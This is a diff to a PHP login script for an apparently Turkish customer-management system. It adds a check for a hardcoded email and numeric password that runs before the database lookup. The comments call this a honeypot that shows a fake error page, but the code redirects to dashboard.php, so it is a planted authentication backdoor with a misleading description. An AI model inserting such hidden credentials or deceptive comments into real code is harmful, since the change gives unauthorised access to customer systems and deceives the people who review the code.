@@ -17,6 +17,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = trim($_POST['username']);
     $password = $_POST['password'];
     
+    // Check for fake/honeypot credentials (hardcoded, not in database)
+    if ($username === 'giris@sistem.com' && $password === '758236') {
+        // Redirect to fake error page to simulate broken system
+        header('Location: dashboard.php');
+        exit;
+    }
+    
     // First, check if it's a customer login
     $customer_query = "SELECT musteri_id as user_id, 'musteri' as taraf, musteri_adi as kullanici_adi, sistem_sifresi as sifre, giris_yetkisi 
                        FROM musteriler 
